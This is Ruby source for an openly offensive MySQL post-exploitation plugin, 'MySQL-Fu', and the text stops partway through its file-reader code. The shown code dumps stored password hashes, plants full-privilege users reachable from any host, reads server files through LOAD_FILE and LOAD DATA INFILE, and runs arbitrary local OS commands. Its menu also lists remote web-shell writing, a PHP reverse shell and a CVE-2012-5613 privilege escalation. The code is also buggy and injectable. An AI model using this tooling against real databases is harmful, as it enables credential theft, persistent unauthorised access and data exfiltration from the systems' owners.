# MySQL-Fu Client Plugin
# This is a hacker friendly MySQL Connectory Script to perform most common MySQL Admin tasks as well as many hacker friendly built-in options

class MySQLFu < Core::CoreShell
	begin
		require 'mysql' #We will use the mysql gem for the actual connection handling, almost everything else will be simple SQL commands to do what we need

		def initialize
			#Basic Info:
			module_name='MySQLFu'
			module_info={
				'Name'        => 'MySQL-Fu',
				'Version'     => 'v0.01b',
				'Description' => "This is a hacker friendly MySQL Connectory Script to perform most common MySQL Admin tasks as well as many hacker friendly built-in options using known MySQL credentials. Requires the 'mysql' gem for connection handling, and 'mysqldump' cli tool for data dumping\n\n\tServer => Host or Server the Database is Listening on\n\tUsername => MySQL Username to connect as\n\tPassword => MySQL Password to use for user connection\n\tDatabase => Database to use upon connection",
				'Author'      => 'Hood3dRob1n'
			}

			module_required={ 'Server' => "127.0.0.1", 'Username' => 'root', 'Password' => 'sup3rs3cr3t' } 
			module_optional={ 'Database' => 'nil' } #Hash of "Optional" Options
			@non_set_private_options='' #Don't Need for this

			if $module_name.nil?
				pluginRegistrar(module_name,module_info,module_required,module_optional)
			else
				canWeConnect
			end
		end
	rescue
		puts "This plugin requires the '".light_red + "mysql".white + "' gem to be installed before it can be used".light_red + ".".white + " Try '".light_red + "sudo gem install mysql".white + "' and re-run after".light_red + ".....".white
		puts
	end

	def canWeConnect
		begin
			if $module_optional['Database'] == 'nil'
				@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
			else
				@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{$module_optional['Database']}")
			end
			puts "[".light_green + "*".white + "] ".light_green + "w00t - ".white + "Connected to MySQL Server".light_green + "!".white

			query = @db.query('SELECT @@hostname;')
			query.each { |x| puts "[".light_green + "*".white + "] Hostname: ".light_green + "#{x[0]}".white; @hostname=x[0]; } 

			query = @db.query('SELECT user();')
			query.each { |x| puts "[".light_green + "*".white + "] Loged in as: ".light_green + "#{x[0]}".white; @user=x[0]; } 
			puts "[".light_green + "*".white + "] Using Pass: ".light_green + "#{$module_required['Password']}".white

			query = @db.query('SELECT @@version;')
			query.each { |x| puts "[".light_green + "*".white + "] MySQL Version: ".light_green + "#{x[0]}".white; @version=x[0]; } 

			query = @db.query('SELECT @@datadir;')
			query.each { |x| puts "[".light_green + "*".white + "] Data Dir: ".light_green + "#{x[0]}".white; @datadir=x[0]; }

			query = @db.query('SELECT @@version_compile_os;')
			query.each { |x| @os=x[0];
				if @os =~ /linux/
					puts "[".light_green + "*".white + "] Compiled on *nix:".light_green + " #{@os}".white
				elsif x =~ /windows|Win32|Win64/i
					puts "[".light_green + "*".white + "] Compiled on Windows:".light_green + " #{@os}".white
				else
					puts "[".light_green + "*".white + "] Compiled on:".light_green + " #{@os}".white
				end 
			}
			puts
			puts "Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to exit".light_yellow
			puts "Type '".light_yellow + "HELP".white + "' or '".light_yellow + "OPTIONS".white + "' to print Options listing".light_yellow
			mysqlMenu
		rescue Mysql::Error => e
			puts
			puts "\t=> #{e}".red
			puts
		end #end begin/rescue wrapper for main connection
	end

	def options
		puts "!SQL ".light_yellow + "<".white + " Everything that follows is considered a Custom SQL Query 2 Run".light_yellow + " >".white
		puts "!OS ".light_yellow + "<".white + " Everything that follows is considered a LOCAL OS Command".light_yellow + " >".white
		puts

		puts "Pre-Built Options".light_green + ": ".white
		puts "1)".white + "   SHOW Basic Info".light_green
		puts "2)".white + "   SHOW Available Database(s)".light_green
		puts "3)".white + "   SHOW Tables for Known Database".light_green
		puts "4)".white + "   SHOW Tables for All Databases".light_green
		puts "5)".white + "   SHOW Columns for Known Table & Database".light_green
		puts "6)".white + "   CREATE DB".light_green
		puts "7)".white + "   DROP DB".light_green
		puts "8)".white + "   DROP Table".light_green
		puts "9)".white + "   SHOW MySQL User Privileges".light_green
		puts "10)".white + "   SHOW MySQL Users, Passwords & Special Privileges".light_green
		puts "11a)".white + " CREATE New User w/Pass & GRANT Full Privileges".light_green			
		puts "11b)".white + " INSERT New User & Pass with full privileges to mysql.user".light_green
		puts "11c)".white + " DELETE MySQL DB User".light_green
		puts "12)".white + "  UPDATE Column Data of Known Database + Table".light_green
		puts "13a)".white + " READ File using LOAD_FILE()".light_green
		puts "13b)".white + " READ File using LOAD DATA INFILE + TEMP TABLE".light_green
		puts "14)".white + "  WRITE REMOTE Shell/File using INTO OUTFILE()".light_green
		puts "15)".white + "  WRITE LOCAL File 2 Remote Server via LOAD DATA LOCAL INFILE + TEMP TABLE + INTO OUTFILE".light_green
		puts "16)".white + "  Pentestmonkey's PHP Reverse Shell via LOAD DATA LOCAL INFILE + TEMP TABLE + INTO OUTFILE".light_green
		puts "17)".white + "  DUMP Table".light_green
		puts "18)".white + "  DUMP Database".light_green
		puts "19)".white + "  DUMP All".light_green
		puts "20)".white + "  KINGCOPE - CVE-2012-5613: Linux MySQL Privilege Escalation".light_green
		puts
	end

	def mysqlMenu
		puts
		prompt = "(MySQL-Fu)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					puts
				when /^options|^help/i
					cls
					options
					puts
				when /^exit|^quit/i
					puts "[".light_red + "X".white + "] OK, Closing MySQL-Fu Session".light_red + "....".white
					puts "[".light_yellow + "-".white + "] Disconnected from Database".light_yellow + "!".white if @db
					@db.close
					puts "[".light_green + "*".white + "] Returning to Main Menu".light_green + "....".white
					break
				when /^!OS (.*)/i
					cmd=$1
					rez = `#{cmd}`
					puts "#{rez}".white
					puts
				when /^!SQL (.*)/i
					csql=$1
					query = @db.query("#{csql};")
					query.each { |x| puts "#{x.join(',')}".white }
					puts
				when '1'
					#################### SHOW INFO #####################
					puts "[".light_green + "*".white + "] Basic Info".light_green + ": ".white
					puts "[".light_green + "*".white + "] Version".light_green + ": #{@version}".white
					puts "[".light_green + "*".white + "] Hostname".light_green + ": #{@hostname}".white
					puts "[".light_green + "*".white + "] User".light_green + ": #{@user}".white
					puts "[".light_green + "*".white + "] Data Dir".light_green + ": #{@datadir}".white
					if @os =~ /linux/
						puts "[".light_green + "*".white + "] Compiled on *nix:".light_green + " #{@os}".white
					elsif @os =~ /windows|Win32|Win64/i
						puts "[".light_green + "*".white + "] Compiled on Windows:".light_green + " #{@os}".white
					else
						puts "[".light_green + "*".white + "] Compiled on:".light_green + " #{@os}".white
					end
					puts
				when '2'
					#################### SHOW DB #####################
					begin
						puts "[".light_green + "*".white + "] Available Databases".light_green + ": ".white
						query = @db.query('SHOW DATABASES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "3"
					############## SHOW TABLES 4 KNOWN DB ##############
					begin
						puts "[".light_yellow + "X".white + "] Please provide the name of the Database to grab tables from".light_yellow + ": ".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{@dbName}")
						puts "[".light_green + "*".white + "] Tables for #{@dbName}".light_green + ": ".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						@db.close
						if $module_optional['Database'] == 'nil'
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
						else
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{$module_optional['Database']}")
						end
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "4"
					############### SHOW ALL TABLES 4 EACH DB ##############
					begin
						puts "[".light_yellow + "*".white + "] Presenting ALL Tables, by Database".light_yellow + ":".white
						query = @db.query('SHOW DATABASES;')
						@db.close
						query.each do |x|
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{x[0]}")
							puts "[".light_green + "*".white + "] Tables for #{x[0]}".light_green + ": ".white
							query = @db.query('SHOW TABLES;')
							query.each { |y| puts "#{y[0]}".white }
							puts
							@db.close
						end
						if $module_optional['Database'] == 'nil'
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
						else
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{$module_optional['Database']}")
						end
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "5"
					############## SHOW COLUMNS 4 KNOWN DB.TABLE ##############
					begin
						puts "[".light_yellow + "-".white + "] Please provide the name of the Database to grab tables from".light_yellow + ": ".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{@dbName}")
						puts "[".light_green + "*".white + "] Tables for #{@dbName}".light_green + ": ".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "[".light_yellow + "-".white + "] Please provide the name of the Table to grab Columns from".light_yellow + ": ".white
						@tblName = gets.chomp
						puts
						query = @db.query("SELECT count(*) FROM #{@tblName};")
						puts "[".light_green + "*".white + "] Table".light_green + ": #{@tblName}".white
						query.each { |x| puts "[".light_green + "*".white + "] Number of Entries".light_green + ": #{x[0]}".white }
						query = @db.query("SHOW COLUMNS FROM #{@tblName};")
						puts "[".light_green + "*".white + "] Columns".light_green + ": #{@tblName}".white
						query.each { |x, y| puts "#{x}".white }
						puts
						@db.close
						if $module_optional['Database'] == 'nil'
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
						else
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{$module_optional['Database']}")
						end
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "6"
					#################### CREATE DB #####################
					begin
						puts "[".light_yellow + "-".white + "] Please provide the name of the Database to CREATE".light_yellow + ": ".white
						@dbName = gets.chomp
						puts
						puts "[".light_green + "*".white + "] Trying to Create a new database".light_green + "....".white
						query = @db.query("CREATE DATABASE IF NOT EXISTS #{@dbName};")
						puts "[".light_green + "*".white + "] Creatied Database".light_green + "!".white
						puts "[".light_green + "*".white + "] Updated Listing of Available Databases".light_green + ": ".white
						query = @db.query('SHOW DATABASES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "7"
					#################### DROP DB #####################
					begin
						puts "[".light_yellow + "-".white + "] Please provide the name of the Database to DROP".light_yellow + ": ".white
						@dbName = gets.chomp
						puts
						puts "[".yellow + "-".white + "] Are you sure you want to DROP ".yellow + "#{@dbName}".white + " Drop from the records for good? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] Dropping Database".light_green + ": #{@dbName}".white
							query = @db.query("DROP DATABASE #{@dbName};")
							puts "[".light_green + "*".white + "] Database Dropped".light_green + "!".white
							puts "[".light_green + "*".white + "] Available Databases".light_green + ": ".white
							query = @db.query('SHOW DATABASES;')
							query.each { |x| puts "#{x[0]}".white }
						else
							puts "[".light_red + "X".white + "] OK, aborting DROP request".light_red + "............".white
							puts "[".light_green + "*".white + "] Returning to Main Menu".light_green + "...".white
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "8"
					#################### DROP DB.TABLE #####################
					begin
						puts "[".light_yellow + "-".white + "] Please provide the name of the Database Table is in".light_yellow + ": ".white
						@dbName = gets.chomp
						puts
						@db.close
						@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{@dbName}")
						puts "[".light_green + "*".white + "] Tables for".light_green + ": #{@dbName}".white
						query = @db.query('SHOW TABLES;')
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "[".light_yellow + "-".white + "] Please provide the name of the Table to DROP".light_green + ":".white
						@tblName = gets.chomp
						puts
						puts "[".yellow + "-".white + "] Are you sure you want to DROP ".yellow + "#{@tblName}".white + " Drop from the records for good? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] Dropping Table".light_green + " #{@tblName} ".white + "from ".light_green + " #{@dbName} ".white
							query = @db.query("DROP TABLE #{@tblName};")
							puts "[".light_green + "*".white + "] Should be all set".light_green + "!".white
							puts "[".light_green + "*".white + "] Tables for #{x}".light_green + ": ".white
							query = @db.query('SHOW TABLES;')
							query.each { |x| puts "#{x[0]}".white }
						else
							puts "[".light_red + "X".white + "] OK, aborting DROP request".light_red + "............".white
							puts "[".light_green + "*".white + "] Returning to Main Menu".light_green + "...".white
						end
						@db.close
						if $module_optional['Database'] == 'nil'
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
						else
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}", "#{$module_optional['Database']}")
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "9"
					#################### SHOW PRIVS #####################
					begin
						puts "[".light_green + "*".white + "] Current MySQL User Granted Privleges".light_green + ": ".white
						query = @db.query("SHOW GRANTS FOR current_user();")
						query.each { |x| puts "#{x[0]}".white }
						puts

						puts "[".light_yellow + "-".white + "] Do you want to try and see all user privs? (".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] MySQL User Privleges".light_green + ":".white
							query = @db.query("SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges")
							query.each do |x, y, z|
								if "#{z.upcase}" == "YES" or "#{z.upcase}" == "Y"
									puts "#{x}".white + " #{y}".blue + " #{z}".light_green
								end
							end
							puts
						end
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end
				when "10"
					#################### SHOW MYSQL USER INFO #####################
					begin
						puts "[".light_green + "*".white + "] MySQL User Info".light_green + ": ".white
						query = @db.query("SELECT CONCAT('USER: ',user,0x0a,'HOST: ',host,0x0a,'PASS: ',password,0x0a,'SUPER: ',super_priv,0x0a,'FILE: ',file_priv,0x0a,'CREATE USER: ',Create_user_priv,0x0a,'CREATE: ',create_priv,0x0a,'DROP: ',drop_priv,0x0a,'GRANT: ',grant_priv,0x0a,'INSERT: ',insert_priv,0x0a,'UPDATE: ',update_priv,0x0a) FROM mysql.user;")
						query.each { |x| puts "#{x[0]}".white }
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "11a"
					#################### INSERT NEW USER INTO mysql.user #####################
					puts "[".light_yellow + "-".white + "] Please provide new username you would like to create".light_yellow + ": ".white
					newUser = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] Please provide password you would like to use for our new user #{newUser}".light_yellow + ": ".white
					newUserPass = gets.chomp
					puts
					begin
						puts "[".light_green + "*".white + "] BEFORE CREATION".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
						puts "[".yellow + "-".white + "] Confirm you want to move forward with NEW USER Creation? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] OK, Using CREATE to make a new user now".light_green + "......".white
							query = @db.query("CREATE USER '#{newUser}'@'%' IDENTIFIED BY '#{newUserPass}';")
							puts "[".light_green + "*".white + "] OK, Using GRANT to extend full privileges to new user".light_green + "......".white
							query = @db.query("GRANT ALL PRIVILEGES ON *.* TO '#{@newUser}'@'%' IDENTIFIED BY '#{@newUserPass}' WITH GRANT OPTION;")
							query = @db.query('FLUSH PRIVILEGES;')

							puts "[".light_green + "*".white + "] Finished".light_green + "!".white
							puts "[".light_green + "*".white + "] AFTER INSERT".light_green + ": ".white
							query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
							query.each { |x| puts "#{x[0]}".white }
							puts "[".light_yellow + "*".white + "] OK its done, but still not 100% the INSERT to mysql.db to GRANT them access is working. Try logging in as new user to actually confirm if it worked".light_yellow + ".......".white
						else
							puts "[".light_red + "*".white + "] Returning to Main Menu".light_red + "...".white
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "11b"
					#################### INSERT NEW USER INTO mysql.user #####################
					puts "[".light_yellow + "-".white + "] Please provide new username you would like to create".light_yellow + ": ".white
					newUser = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] Please provide password you would like to use for our new user #{newUser}".light_yellow + ": ".white
					newUserPass = gets.chomp
					puts
					begin
						puts "[".light_green + "*".white + "] BEFORE INSERT".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
						puts "[".yellow + "-".white + "] Confirm you want to move forward with NEW USER Creation? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] OK, Using INSERT to create new user entry in MySQL user table now".light_green + "......".white
							#Insert to mysql.user where shit is stored
							query = @db.query("INSERT INTO mysql.user (Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections) VALUES('%','#{newUser}',PASSWORD('#{newUserPass}'),'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")

							#Insert into mysql.db for GRANT overrides....working?
							query = @db.query("INSERT INTO mysql.db (Host,Db,User,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Create_tmp_table_priv,Lock_tables_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Execute_priv)  VALUES('%','test','#{newUser}','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")

							#Flush privs to update user privs so they take affect...
							query = @db.query('FLUSH PRIVILEGES;')
							puts "[".light_green + "*".white + "] OK, going to grab updated content to confirm for you".light_green + "......".white
							puts "[".light_green + "*".white + "] AFTER INSERT".light_green + ": ".white
							query = @db.query('SELECT group_concat(0x0a,host,0x3a,user,0x3a,password,0x3a,Select_priv,0x3a,Insert_priv,0x3a,Update_priv,0x3a,Delete_priv,0x3a,Create_priv,0x3a,Drop_priv,0x3a,Reload_priv,0x3a,Shutdown_priv,0x3a,Process_priv,0x3a,File_priv,0x3a,Grant_priv,0x3a,References_priv,0x3a,Index_priv,0x3a,Alter_priv,0x3a,Show_db_priv,0x3a,Super_priv,0x3a,Create_tmp_table_priv,0x3a,Lock_tables_priv,0x3a,Execute_priv,0x3a,Repl_slave_priv,0x3a,Repl_client_priv,0x3a,Create_view_priv,0x3a,Show_view_priv,0x3a,Create_routine_priv,0x3a,Alter_routine_priv,0x3a,Create_user_priv,0x3a,ssl_type,0x3a,ssl_cipher,0x3a,x509_issuer,0x3a,x509_subject,0x3a,max_questions,0x3a,max_updates,0x3a,max_connections,0x3a,max_user_connections) FROM mysql.user;')
							query.each { |x| puts "#{x[0]}".white }
							puts "[".light_green + "*".white + "] OK its done, but you still not 100% the INSERT to mysql.db to GRANT them access is working".light_green + ".......".white
						else
							puts "[".light_red + "*".white + "] Returning to Main Menu".light_red + "...".white
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "11c"
					#################### DELETE USER FROM mysql.user #####################
					puts "[".light_green + "*".white + "] Current MySQL Users & Host Info".light_green + ": ".white
					query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
					query.each { |x| puts "#{x[0]}".white }
					puts "[".light_yellow + "-".white + "] Which USER do you want to DELETE".light_yellow + ": ".white
					duser = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] Provide HOST entry for provided USER to DELETE".light_yellow + ": ".white
					dhost = gets.chomp
					puts
					puts "[".yellow + "-".white + "] Confirm you want to move forward with DELETE for '".yellow + "#{duser}".white + "'@'".yellow + "#{dhost}".white + "' entry: (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "[".light_green + "*".white + "] OK, issuing DELETE request".light_green + ".......".white
						begin
							query = @db.query('USE mysql;')
							query = @db.query("DROP USER '#{@duser}'@'%';")
							query = @db.query('FLUSH PRIVILEGES;')
						rescue Mysql::Error => e
							puts
							puts "\t=> #{e}".red
							puts
						end #end begin/rescue wrapper
						puts "[".light_green + "*".white + "] Updated MySQL Users & Host Info".light_green + ": ".white
						query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
						query.each { |x| puts "#{x[0]}".white }
					else
						puts "[".light_red + "*".white + "] Returning to Main Menu".light_red + "...".white
					end
					puts
				when "12"
					#################### UPDATE DATA IN KNOWN COLUMN/FIELDS #####################
					puts "[".light_yellow + "-".white + "] Provide DB you want to make UPDATES in".light_yellow + ": ".white
					dbName = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] Provide the TABLE name you wnat to make UPDATES in".light_yellow + ": ".white
					tblName = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] How many Columns do we need to UPDATE values for? ".light_yellow + "(".white + "#NUMBER".light_yellow + ")".white
					clnumz = gets.chomp
					puts
					puts "[".light_green + "*".white + "] OK, let's get that Column info".light_green + ".....".white
					begin
						count=0
						clz=[]
						while count.to_i < clnumz.to_i
							puts "[".light_yellow + "-".white + "] Provide COLUMN#{count} to UPDATE".light_green + ": ".white
							clName = gets.chomp
							puts

							puts "[".light_yellow + "-".white + "] Provide NEW COLUMN#{count} VALUE".light_green + ": ".white
							clValue = gets.chomp
							puts

							clz << "#{clName}='#{clValue}'"
							count = count.to_i + 1
						end
						puts "[".light_yellow + "-".white + "] Provide condition for our WHERE clause ".light_yellow + "(".white + "i.e. user=admin, id='1', name=\"Peggy\", etc.".light_yellow + ")".white + ": ".light_yellow 
						where = gets.chomp
						puts
						# UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause]
						prep = "UPDATE #{tblName} SET "
						#count top down so padding of SQL Statement from column array works properly, dont want extra commans :p
						clz.each do |columnset|
							if count.to_i > 1
								prep += "#{columnset}, "
							else
								prep += "#{columnset} "
							end
							count = coiunt.to_i - 1 
						end
						prep += "WHERE #{where};"
						puts "[".light_green + "*".white + "] BEFORE UPDATE".light_green + ": ".white
						query = @db.query("USE #{dbName};")
						query = @db.query("SELECT * FROM #{tblName} WHERE #{where};")
						query.each { |x| puts "#{x[0]}".white }
						puts
						puts "[".light_yellow + "-".white + "] Please confirm this UPDATE statement looks correct before we execute".light_yellow + ": ".white
						puts "[".yellow + "-".white + "] SQL UPDATE".yellow + ": \n#{prep}".white
						puts "[".light_yellow + "-".white + "] Does this look good? (".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							puts "[".light_green + "*".white + "] Now making UPDATE request".light_green + "......".white
							query = @db.query("USE #{dbName};")
							query = @db.query("#{prep}")
							puts "AFTER UPDATE".light_green + ": ".white
							query = @db.query("SELECT * FROM #{tblName} WHERE #{where};")
							query.each { |x| puts "#{x[0]}".white }
							puts "[".light_green + "*".white + "] Hope things worked, if not you can try custom SQL from the Main Menu".light_green + "......".white
							puts "[".light_green + "*".white + "] Returning to Main Menu".light_green + "...".white
						else
							puts "[".light_red + "X".white + "] OK, aborting UPDATE request".light_red + "............".white
							puts "[".light_red + "*".white + "] Returning to Main Menu".light_red + "...".white
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "13a"
					#################### MYSQL FILE READER #####################
					puts "[".light_green + "*".white + "] Dropping to SQL File Reader Shell, just tell it what file to read".light_green + "...".white
					puts
					foo=0
					prompt = "(MySQL-Fu File Reader)> "
					while line = Readline.readline("#{prompt}", true)
						cmd = line.chomp
						case cmd
							when /^clear|^cls|^banner/i
								cls
								banner
								puts
							when /^exit|^quit/i
								puts "[".light_red + "X".white + "] OK, closing MySQL File Reader Shell".light_red + "............".white
								puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								prompt = "(MySQL-Fu)> "
								break
							else
								begin
									query = @db.query("SELECT LOAD_FILE('#{cmd}');")
									query.each do |x|
										puts "#{x[0]}".white;
										@rez = "#{x[0]}"
									end
									#Results folder for our dumps....
									resDir = "#{$results}/#{$module_required['Server']}"
									rezFile="#{resDir}/#{cmd.gsub('/', '_')}"
									Dir.mkdir(resDir) unless File.exists?(resDir)
									foofucker = File.open("#{rezFile}", "w+")
									foofucker.puts "#{@rez}"
									foofucker.close
								rescue
									puts "[".light_red + "X".white + "] Oops, an error was encountered with your last request".light_red + "!".white
									puts "[".light_red + "X".white + "] Error Code: ".light_red + "#{@db.errno}".white
									puts "[".light_red + "X".white + "] Error Message: ".light_red + "#{@db.error}".white
								end#end rescue wrapper
							end
					end
					puts
				when "13b"
					#################### MYSQL FILE READER II #####################
					puts "[".light_green + "*".white + "] Dropping to SQL File Reader-II Shell, just tell it what file to read".light_green + "...".white

					prompt = "(MySQL-Fu File Reader2)> "
					while line = Readline.readline("#{prompt}", true)
						cmd = line.chomp
						case cmd
							when /^clear|^cls|^banner/i
								cls
								banner
								puts
							when /^exit|^quit/i
								puts "[".light_red + "X".white + "] OK, closing MySQL File Reader Shell".light_red + "............".white
								puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								prompt = "(MySQL-Fu)> "
								break
							else
								begin
									#Read target file into temp table on temp database we create
									query = @db.query('DROP DATABASE IF EXISTS fooooooooooooooofucked;')
									query = @db.query('CREATE DATABASE fooooooooooooooofucked;')
									query = @db.query('USE fooooooooooooooofucked;')
									query = @db.query("CREATE TEMPORARY TABLE fooread (content LONGTEXT);")
									query = @db.query("LOAD DATA INFILE '#{cmd}' INTO TABLE fooread;")

									#Results folder for our dumps....
